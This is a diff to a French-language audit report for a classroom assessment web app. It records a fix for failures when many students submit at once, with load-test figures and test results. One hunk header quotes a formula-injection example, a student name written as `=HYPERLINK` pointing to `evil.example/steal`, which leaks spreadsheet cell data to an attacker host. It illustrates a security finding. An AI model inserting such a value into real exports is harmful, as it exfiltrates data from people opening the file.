@@ -175,7 +175,7 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 
 **Constats, par gravité :**
 1. **Limiteurs par IP inadaptés aux classes** (`joinLimiter` 15/15 min, `attemptActionLimiter` 120/5 min par IP) — **corrigé, voir ci-dessous**.
-2. **Soumission simultanée** : ≈ 16 requêtes SQL + une transaction par soumission ; le pool `pg` par défaut (10 connexions) est saturé → Prisma `P2028 Unable to start a transaction in the given time` → erreur 500. **Ouvert.**
+2. **Soumission simultanée** : ≈ 16 requêtes SQL + une transaction par soumission ; le pool `pg` par défaut (10 connexions) est saturé → Prisma `P2028 Unable to start a transaction in the given time` → erreur 500. **Corrigé, voir ci-dessous.**
 3. **9 à 16 requêtes SQL séquentielles par action** (une par relation chargée, cache invalidé à chaque écriture) → très sensible à la distance Render↔Neon. Pistes : mettre à jour le cache en place (mesuré : autosave ×75 plus rapide à 20 ms), `relationLoadStrategy: "join"` (nécessite `previewFeatures = ["relationJoins"]` + régénération du client, non testé), aligner les régions Render/Neon. **Ouvert.**
 4. **`trust proxy = 1` non vérifié sur Render** (derrière Cloudflare) : si `req.ip` est l'IP du proxy, tous les limiteurs par IP (login 10/15 min, inscription 5/h, IA, PDF, entrée) partagent un seul compteur pour tous les utilisateurs. À vérifier en loggant `req.ip` / `X-Forwarded-For` sur un vrai appel. **Ouvert.**
 5. **Non mesuré, lu dans le code :** dépôts de fichiers lus en entier en mémoire (OOM possible sur 512 Mo avec beaucoup de dépôts simultanés) ; emails de résultats envoyés pendant la soumission (quota Resend gratuit, expéditeur `onboarding@resend.dev` limité à l'adresse du compte tant qu'aucun domaine n'est vérifié) ; `GET /api/evaluations` renvoie toutes les tentatives de toutes les évaluations (149 Ko pour 250 tentatives d'une seule évaluation) ; CPU ≈ 6–18 ms/requête, donc plafond bas sur une petite instance Render.
@@ -187,7 +187,29 @@ Un étudiant nommé par exemple `=HYPERLINK("http://evil.example/steal?x="&A2,"c
 - sondage d'identifiants : plafond par IP de **600 réponses 404 / 5 min** (les requêtes réussies ne comptent pas), pour ne pas perdre toute protection contre l'énumération.
 - Compromis assumé : un élève malveillant derrière la même IP peut bloquer ses camarades 5 min en provoquant 600 erreurs 404 ; borner cela exigerait des comptes élèves.
 
-**Vérification :** 5 nouveaux tests ([attempt.routes.test.js](backend/src/routes/__tests__/attempt.routes.test.js)) : 250 élèves derrière une même IP passent sans 429 (entrée + lecture + sauvegarde), limite par tentative sans effet sur les autres, plafond d'entrée configurable, blocage du sondage 404, limite de dépôts. Suite unitaire `139 passed`, intégration `16 passed`. Simulation A rejouée avec les limiteurs actifs : **250/250 entrent, 250/250 soumettent, 0 refus 429** (avant : 15/250 et 0).
+**Correctif appliqué — soumission simultanée (n°2, 2026-09-26) :**
+- **Cause :** chaque soumission faisait 1 lecture des réponses + 1 `UPDATE` par réponse dans une transaction + `attempt.update` avec `include` (transaction + 2 `SELECT`) + un rechargement complet de la copie (9 `SELECT` séquentiels) ; avec un pool de 10 connexions et un `maxWait` de transaction de 2 s (défaut Prisma), une ruée de soumissions échouait en `P2028`.
+- **Serveur** ([attempt.service.js](backend/src/services/attempt.service.js), [prisma.js](backend/src/lib/prisma.js)) :
+  - `finalizeAttempt` : notes calculées en mémoire, écrites par **groupes de même note** (`updateMany`, 2–3 requêtes au lieu de 20) **dans la même transaction** que le changement de statut ; l'état final est **construit en mémoire** et mis dans le cache (plus de rechargement de 9 requêtes ; la lecture qui suit la soumission est un cache hit) ;
+  - les réponses sont toujours relues à la clôture (pas prises dans le cache) pour ne perdre aucune sauvegarde récente ;
+  - les réponses non notées automatiquement (questions ouvertes) ne sont plus réécrites à `null` : une note saisie par l'enseignant avant la clôture n'est plus écrasée ;
+  - `/submit` est **idempotent** : une tentative déjà terminée (ou expirée côté serveur) renvoie son état final (200) au lieu de 409 ; le blocage par sorties d'onglet ne recharge plus la copie deux fois ;
+  - l'email de résultats (QCM 100 %) n'est plus attendu pendant la soumission ;
+  - pool de connexions **20** par défaut (`DATABASE_POOL_SIZE`), `transactionOptions` `maxWait` 15 s / `timeout` 30 s.
+- **Frontend** ([TakeEvaluation.jsx](frontend/src/features/pages/TakeEvaluation.jsx)) : réessais automatiques de la soumission (5 essais, attente exponentielle aléatoire) sur erreur réseau / 429 / 5xx ; **une seule** soumission automatique à l'expiration du temps — avant, un échec ou un 409 relançait `handleSubmit` en boucle serrée, sans pause, ce qui aggravait la surcharge.
+- **Mesuré (250 élèves, charge lourde = 1 sauvegarde / 3 s pendant 90 s, puis soumission simultanée ; limiteurs actifs ; latence de base simulée) :**
+
+| Latence par requête SQL *(« avant » mesuré limiteurs coupés, pour isoler la soumission)* | Soumission avant → après (médiane) | Soumissions en erreur avant → après |
+|---|---|---|
+| 5 ms | 13,0 s → **0,17 s** | 21 → **0** |
+| 20 ms | 19,4 s → **3,9 s** | 83 → **0** |
+| 60 ms | 17,8 s → **10,4 s** | 179 → **0** |
+| 60 ms, charge réaliste (1 réponse / 15 s) | 14,2 s → **4,4 s** | 141 → **0** |
+
+- **Reste lent à 60 ms :** l'autosave (9–11 requêtes SQL séquentielles par sauvegarde, cache vidé à chaque écriture, voir n°3) — médiane 5,3 s en charge lourde à 60 ms. La latence Render↔Neon est le facteur dominant : à aligner en priorité.
+- **Tests :** `attempt.service.test.js` mis à jour (regroupement des écritures, non-écrasement des notes enseignant, une seule lecture de contexte au blocage) + 7 tests `submitAttempt` (une transaction, révélation immédiate d'un QCM sans attendre l'email, idempotence, expiration, 404, 403, cache) ; suite unitaire `148 passed`, intégration `16 passed`, lint et build frontend OK.
+
+**Vérification (limiteurs) :** 5 nouveaux tests ([attempt.routes.test.js](backend/src/routes/__tests__/attempt.routes.test.js)) : 250 élèves derrière une même IP passent sans 429 (entrée + lecture + sauvegarde), limite par tentative sans effet sur les autres, plafond d'entrée configurable, blocage du sondage 404, limite de dépôts. Suite unitaire `139 passed`, intégration `16 passed`. Simulation A rejouée avec les limiteurs actifs : **250/250 entrent, 250/250 soumettent, 0 refus 429** (avant : 15/250 et 0).
 
 ---
 
